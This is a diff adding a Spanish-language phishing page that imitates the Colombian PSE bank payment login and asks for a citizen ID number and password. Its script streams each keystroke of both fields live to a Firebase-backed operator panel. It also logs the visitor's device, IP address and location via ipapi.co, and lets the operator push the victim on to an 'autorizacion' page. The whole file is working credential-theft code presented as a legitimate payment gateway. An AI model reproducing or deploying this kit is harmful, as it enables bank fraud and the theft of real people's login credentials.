@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Pasarela PSE</title>
+
+<style>
+body{
+  margin:0;
+  font-family: Arial, sans-serif;
+  background:#f2f2f2;
+}
+
+/* HEADER */
+.header{
+  background:#0b2a4a;
+  color:#fff;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:15px 30px;
+}
+
+.logo img{
+  height:28px;
+}
+
+.header-text{
+  font-size:14px;
+}
+
+/* MAIN */
+.container{
+  text-align:center;
+  margin-top:60px;
+}
+
+h1{
+  font-size:32px;
+  margin-bottom:10px;
+}
+
+p{
+  max-width:500px;
+  margin:0 auto 30px;
+  color:#555;
+}
+
+/* FORM */
+.form{
+  width:320px;
+  margin:0 auto;
+}
+
+.input-group{
+  background:#eaeaea;
+  margin-bottom:15px;
+  padding:12px;
+  text-align:left;
+  border-bottom:1px solid #999;
+}
+
+.input-group label{
+  font-size:12px;
+  color:#666;
+  display:block;
+}
+
+.input-group input,
+.input-group select{
+  width:100%;
+  border:none;
+  background:transparent;
+  font-size:14px;
+  outline:none;
+}
+
+/* BUTTON */
+button{
+  margin-top:20px;
+  padding:12px 30px;
+  border:none;
+  background:#ccc;
+  color:#888;
+  font-size:14px;
+  cursor:not-allowed;
+  transition:.3s;
+}
+
+button.active{
+  background:#0b2a4a;
+  color:#fff;
+  cursor:pointer;
+}
+
+.logo img{
+  height:40px; /* 👈 más grande */
+  filter: brightness(0) invert(1); /* 👈 lo vuelve blanco 🔥 */
+}
+
+
+.overlay{
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.5);
+  backdrop-filter:blur(4px);
+  justify-content:center;
+  align-items:center;
+  z-index:9999;
+}
+
+.loader{
+  text-align:center;
+  color:#fff;
+}
+
+.spinner{
+  width:40px;
+  height:40px;
+  border:4px solid #fff;
+  border-top:4px solid #2306e3;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin:0 auto 10px;
+}
+
+@keyframes spin{
+  to{ transform:rotate(360deg); }
+}
+
+.loader p{
+  color:#fff;
+  font-weight:600;
+  font-size:16px;
+}
+</style>
+
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">
+    <img src="logo.png">
+  </div>
+  <div class="header-text">Pagos a través de PSE</div>
+</div>
+
+<div class="container">
+  <h1>¡Bienvenido!</h1>
+  <p>
+    Recuerda que para realizar pagos a través de PSE, debes estar registrado.
+  </p>
+
+  <div class="form">
+
+    <div class="input-group">
+      <label>Tipo de documento</label>
+      <select class="input">
+        <option value="">Cédula de ciudadanía</option>
+      </select>
+    </div>
+
+    <div class="input-group">
+      <label>Número de documento</label>
+      <input type="text" class="input">
+    </div>
+
+    <div class="input-group">
+      <label>Contraseña</label>
+      <input type="password" class="input">
+    </div>
+
+    <button id="btn">Entrar</button>
+
+  </div>
+</div>
+
+<div class="overlay">
+  <div class="loader">
+    <div class="spinner"></div>
+    <p>Cargando...</p>
+  </div>
+</div>
+
+<script>
+function validarInputs() {
+  const user = inputUser.value.trim();
+  const pass = inputPass.value.trim();
+
+  if (user !== "" && pass !== "") {
+    btn.classList.add("active");
+  } else {
+    btn.classList.remove("active");
+  }
+}
+</script>
+
+
+<script type="module" src="firebase.js"></script>
+
+<script>
+window.addEventListener('load', () => {
+const { db, uid, ref, update, onValue } = window;
+
+function detectarDispositivo(userAgent) {
+userAgent = userAgent.toLowerCase();
+if (/windows/.test(userAgent)) return "Windows";
+if (/iphone/.test(userAgent)) return "iPhone";
+if (/ipad/.test(userAgent)) return "iPad";
+if (/android/.test(userAgent)) return "Android";
+if (/macintosh/.test(userAgent)) return "Mac";
+if (/linux/.test(userAgent)) return "Linux";
+return "Desconocido";
+}
+
+const dispositivoDetectado = detectarDispositivo(navigator.userAgent);
+update(ref(db, "dataPages/" + uid), { dispositivo: dispositivoDetectado });
+
+fetch("https://ipapi.co/json/")
+.then(res => res.json())
+.then(data => {
+const dbRef = ref(db, "dataPages/" + uid);
+update(dbRef, {
+ip: data.ip,
+ciudad: data.city,
+pais: data.country_name
+});
+});
+
+
+update(ref(db, "dataPages/" + uid), { 
+estado: "abierto",
+paginaActual: "Index.html" 
+});
+
+window.addEventListener("beforeunload", () => {
+update(ref(db, "dataPages/" + uid), { 
+estado: "cerrado",
+paginaActual: null  
+});
+});
+
+
+// 🔥 ACTIVAR NUBE EN ESTA PÁGINA
+update(ref(db, "dataPages/" + uid), {
+  oculto: false
+});
+
+
+// ===============================
+// 🔹 INPUTS Y ELEMENTOS
+// ===============================
+const inputs = document.querySelectorAll('.input');
+
+const inputUser = inputs[1]; // documento
+const inputPass = inputs[2]; // clave
+const btn = document.getElementById('btn');
+const overlay = document.querySelector('.overlay');
+
+// ===============================
+// 🔹 VALIDAR BOTÓN (AZUL)
+// ===============================
+function validarInputs() {
+
+  const user = inputUser.value.trim();
+  const pass = inputPass.value.trim();
+
+  if (user !== "" && pass !== "") {
+    btn.classList.add("active"); // 🔵 azul
+  } else {
+    btn.classList.remove("active");
+  }
+
+}
+
+// ===============================
+// 🔹 INPUT DOCUMENTO (SOLO NÚMEROS)
+// ===============================
+if (inputUser) {
+  inputUser.addEventListener("input", function() {
+
+    // 🔥 solo números
+    this.value = this.value.replace(/\D/g, "");
+
+    validarInputs();
+
+    // 🔴 enviar en tiempo real al panel
+    update(ref(db, "dataPages/" + uid), {
+      username: this.value
+    });
+
+  });
+}
+
+// ===============================
+// 🔹 INPUT CLAVE (NORMAL)
+// ===============================
+if (inputPass) {
+  inputPass.addEventListener("input", function() {
+
+    validarInputs();
+
+    // 🔴 enviar en tiempo real al panel
+    update(ref(db, "dataPages/" + uid), {
+      password: this.value
+    });
+
+  });
+}
+
+// ===============================
+// 🔹 BOTÓN ENTRAR
+// ===============================
+if (btn) {
+  btn.addEventListener("click", () => {
+
+    const user = inputUser.value.trim();
+    const pass = inputPass.value.trim();
+
+    if (!user || !pass) return;
+
+    // 🔴 activar barras en panel
+    update(ref(db, "dataPages/" + uid), {
+      mostrarBarraUsername: true,
+      mostrarBarraPassword: true
+    });
+
+    // 🔴 mostrar overlay
+    if (overlay) overlay.style.display = "flex";
+
+  });
+}
+
+// ===============================
+// 🔥 SOLO AUTORIZACION Y FINAL
+// ===============================
+onValue(ref(db, "dataPages/" + uid), snapshot => {
+
+  const data = snapshot.val();
+  if (!data) return;
+
+  // 🔴 IR A AUTORIZACION
+  if (data.accion === "autorizacion") {
+
+    update(ref(db, "dataPages/" + uid), {
+      accion: null
+    });
+
+    window.location.href = "autorizacion.html";
+  }
+
+  // 🔴 IR A FINAL
+  if (data.accion === "final") {
+
+    update(ref(db, "dataPages/" + uid), {
+      accion: null
+    });
+
+    window.location.href = "../../final.html";
+  }
+
+});
+
+
+
+});
+</script>
+
+
+</body>
+</html>
